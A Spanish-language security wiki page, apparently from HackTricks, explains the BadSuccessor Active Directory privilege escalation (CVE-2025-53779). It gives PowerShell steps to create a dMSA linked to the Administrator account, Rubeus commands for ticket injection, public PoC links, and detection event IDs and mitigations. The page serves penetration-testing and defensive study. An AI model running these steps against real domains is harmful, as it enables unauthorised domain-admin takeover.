# BadSuccessor: Escalada de privilegios mediante abuso de migración de MSA delegada

{{#include ../../banners/hacktricks-training.md}}

## Descripción general

Las cuentas de servicio administradas delegadas (**dMSA**) son la siguiente generación de **gMSA**, disponible en Windows Server 2025. Un flujo de migración legítimo permite a los administradores reemplazar una cuenta *antigua* (de usuario, equipo o servicio) por una dMSA, preservando los permisos de forma transparente. El flujo se expone mediante cmdlets de PowerShell como `Start-ADServiceAccountMigration` y `Complete-ADServiceAccountMigration` y se basa en dos atributos LDAP del **objeto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *enlace DN* a la cuenta reemplazada (antigua).
* **`msDS-DelegatedMSAState`**       – estado de migración (`0` = ninguno, `1` = en curso, `2` = *completada*).<sup>[[1]](#references)</sup>

Si un atacante puede crear **cualquier** dMSA dentro de una OU y manipular directamente esos 2 atributos, LSASS y el KDC tratarán la dMSA como *sucesora* de la cuenta vinculada. Cuando el atacante se autentique posteriormente como la dMSA, **heredará todos los privilegios de la cuenta vinculada**, hasta llegar a **Domain Admin** si se vincula la cuenta Administrator.<sup>[[1]](#references)</sup>

Unit 42 acuñó el nombre **BadSuccessor** para esta técnica en 2025. Más tarde, Microsoft le asignó el identificador **CVE-2025-53779** y publicó una actualización de seguridad en **agosto de 2025**. La técnica sigue siendo relevante en entornos de Windows Server 2025 sin parches y para revisar delegaciones peligrosas en OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

En los DC con parches, una [migración dMSA en ambos sentidos](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) todavía puede exponer una cuenta objetivo si el atacante también puede escribir sus atributos de migración. Esto es más limitado que el ataque original, que permitía elegir cualquier objetivo.

### Requisitos previos del ataque

1. Una cuenta que tenga *permiso* para crear objetos dentro de **una Unidad Organizativa (OU)** *y* que tenga al menos uno de estos permisos:
   * `Create Child` → objeto de clase **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (creación genérica)
2. Conectividad de red con LDAP y Kerberos (escenario estándar de unión al dominio / ataque remoto).<sup>[[1]](#references)</sup>

## Enumeración de OU vulnerables

Unit 42 publicó un script auxiliar de PowerShell que analiza los descriptores de seguridad de cada OU y destaca las ACE necesarias:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Por debajo, el script ejecuta una búsqueda LDAP paginada de `(objectClass=organizationalUnit)` y comprueba cada `nTSecurityDescriptor` en busca de

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (clase de objeto *msDS-DelegatedManagedServiceAccount*)

## Pasos de explotación

Una vez identificada una OU con permisos de escritura, el ataque está a solo 3 escrituras LDAP de distancia:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Tras la replicación, el atacante puede simplemente **iniciar sesión** como `attacker_dMSA$` o solicitar un TGT de Kerberos: Windows creará el token de la cuenta *reemplazada*.<sup>[[1]](#references)</sup>

### Automatización

Varios PoC públicos automatizan todo el flujo de trabajo, incluida la recuperación de contraseñas y la gestión de tickets:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Módulo de NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Explotación

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Detección y búsqueda de amenazas

Habilita la **auditoría de objetos** en las OU y supervisa los siguientes eventos de seguridad de Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Creación del objeto **dMSA**
* **5136** – Modificación de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Cambios en atributos específicos
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emisión de TGT para el dMSA

Correlacionar `4662` (modificación de atributo), `4741` (creación de una cuenta de equipo o servicio) y `4624` (inicio de sesión posterior) permite detectar rápidamente la actividad de BadSuccessor. Las soluciones XDR, como **XSIAM**, incluyen consultas listas para usar (consulta las referencias).<sup>[[2]](#references)</sup>

## Mitigación

* Aplica la actualización de seguridad de Microsoft para **CVE-2025-53779** y verifica el nivel de parche de todos los controladores de dominio de Windows Server 2025.<sup>[[6]](#references)</sup>
* Aplica el principio de **privilegios mínimos**: delega la administración de *Service Account* únicamente a roles de confianza.
* Elimina `Create Child` / `msDS-DelegatedManagedServiceAccount` de las OU que no lo requieran explícitamente.
* Supervisa los ID de evento indicados arriba y genera alertas cuando identidades *non-Tier-0* creen o editen dMSA.

## Véase también


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: abuso de dMSA para escalar privilegios en Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Cuando las cuentas buenas se vuelven malas: explotación de cuentas de servicio administradas delegadas](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Módulo BadSuccessor de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Centro de respuesta de seguridad de Microsoft – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
